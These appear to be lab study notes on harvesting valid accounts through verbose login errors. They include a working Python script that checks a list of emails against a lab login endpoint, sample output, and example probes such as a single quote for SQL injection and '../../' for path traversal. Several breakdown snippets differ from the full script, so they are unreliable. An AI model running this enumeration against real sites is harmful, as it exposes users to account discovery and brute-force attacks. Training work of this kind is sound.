Verbose errors can turn into a goldmine of information, providing insights such as:
- **Internal Paths**: Like a map leading to hidden treasure, these reveal the file paths and directory structures of the application server which might contain configuration files or secret keys that aren't visible to a normal user.
- **Database Details**: Offering a sneak peek into the database, these errors might spill secrets like table names and column details.
- **User Information**: Sometimes, these errors can even hint at usernames or other personal data, providing clues that are crucial for further investigation.

## Inducing Verbose Errors
Attackers induce verbose errors as a way to force the application to reveal its secrets. Below are some common techniques used to provoke these errors:

1. **Invalid Login Attempts**: This is like knocking on every door to see which one will open. By intentionally entering incorrect usernames or passwords, attackers can trigger error messages that help distinguish between valid and invalid usernames. For example, entering a username that doesn’t exist might trigger a different error message than entering one that does, revealing which usernames are active.
2. **SQL Injection**: This technique involves slipping malicious SQL commands into entry fields, hoping the system will stumble and reveal information about its database structure. For example, placing a single quote ( `'`) in a login field might cause the database to throw an error, inadvertently exposing details about its schema.
3. **File Inclusion/Path Traversal**: By manipulating file paths, attackers can attempt to access restricted files, coaxing the system into errors that reveal internal paths. For example, using directory traversal sequences like `../../` could lead to errors that disclose restricted file paths.
4. **Form Manipulation**: Tweaking form fields or parameters can trick the application into displaying errors that disclose backend logic or sensitive user information. For example, altering hidden form fields to trigger validation errors might reveal insights into the expected data format or structure.
5. **Application Fuzzing**: Sending unexpected inputs to various parts of the application to see how it reacts can help identify weak points. For example, tools like Burp Suite Intruder are used to automate the process, bombarding the application with varied payloads to see which ones provoke informative errors.

## The Role of Enumeration and Brute Forcing
When it comes to breaching authentication, enumeration and brute forcing often go hand in hand:
- **User Enumeration**: Discovering valid usernames sets the stage, reducing the guesswork in subsequent brute-force attacks.
- **Exploiting Verbose Errors**: The insights gained from these errors can illuminate aspects like password policies and account lockout mechanisms, paving the way for more effective brute-force strategies.

## Enumeration in Authentication Forms
In this HackerOne [report](https://hackerone.com/reports/1166054), the attacker was able to enumerate users using the website's Forget Password function. Similarly, we can also enumerate emails in login forms. For example, navigate to [http://enum.thm/labs/verbose_login/](http://enum.thm/labs/verbose_login/)[](http://enum.thm/labs/verbose_login/) and put any email address in the Email input field.

When you input an invalid email, the website will respond with "Email does not exist." indicating that the email has not been registered yet.
	![](Pasted%20image%2020241126182137.png)
However, if the email is already registered, the website will respond with an "Invalid password" error message, indicating that the email exists in the database but the password is incorrect.
	![](Pasted%20image%2020241126182149.png)

## Automation
Below is a Python script that will check for valid emails in the target web app. 
```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

We can use a common list of emails from this [repository](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).
	![](Pasted%20image%2020241126182857.png)
Once you've downloaded the payload list, use the script on the AttackBox or your own machine to check for valid email addresses.
```shell-session
user@tryhackme $ python3 script.py usernames_gmail.com.txt
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[INVALID] xxxxxx@gmail.com
[VALID] xxxxxx@gmail.com
```

### Script breakdown
**Imports**:
- **requests**: A Python library for making HTTP requests. This is used to interact with the web server by sending POST requests to the target endpoint.
    ```python
    import requests
    ```

**Setup**:
- **url**: The script targets the endpoint handling the login functionality of the application.
    ```python
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    ```
    
- **headers**: A collection of HTTP headers is defined to mimic a typical browser request, ensuring the requests appear legitimate.
    ```python
    headers = {
          'Host': 'enum.thm',
          'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest',
          'Origin': 'http://enum.thm',
          'Connection': 'close',
          'Referer': 'http://enum.thm/labs/verbose_login/',
      }
    ```

**Variables Initialization**:
- **valid_emails**: An array stores email addresses confirmed to be valid.
    ```python
    valid_emails = []
    ```
    
- **invalid_error**: A string contains the specific error message used to identify invalid emails.
    ```python
    invalid_error = 'Email does not exist'
    ```

**Main Loop**:
- The script reads email addresses from a provided file and checks each for validity using the `check_email` function.
    ```python
    for email in email_list:
        check_email(email)
    ```

**Crafting and Sending HTTP Requests**:
- For each email, the script constructs a data dictionary that includes the email address, a placeholder password, and a command to execute the 'login' function.
    ```python
    data = {'username': email, 'password': 'password', 'action': 'login'}
    response = requests.post(url, headers=headers, data=data)
    ```

**Response Handling**:
- The response from the server is processed to check if the provided email exists, based on the presence of the specific error message in the JSON data.
    ```python
    if invalid_error in response.text:
        print(f"{email} is invalid.")
    else:
        print(f"{email} is valid.")
        valid_emails.append(email)
    ```

**Character Verification**:
- Emails confirmed to exist are added to the `valid_emails` list, with each email's validity logged to the console.
    ```python
    for email in valid_emails:
        print(f"Valid email found: {email}")
    ```


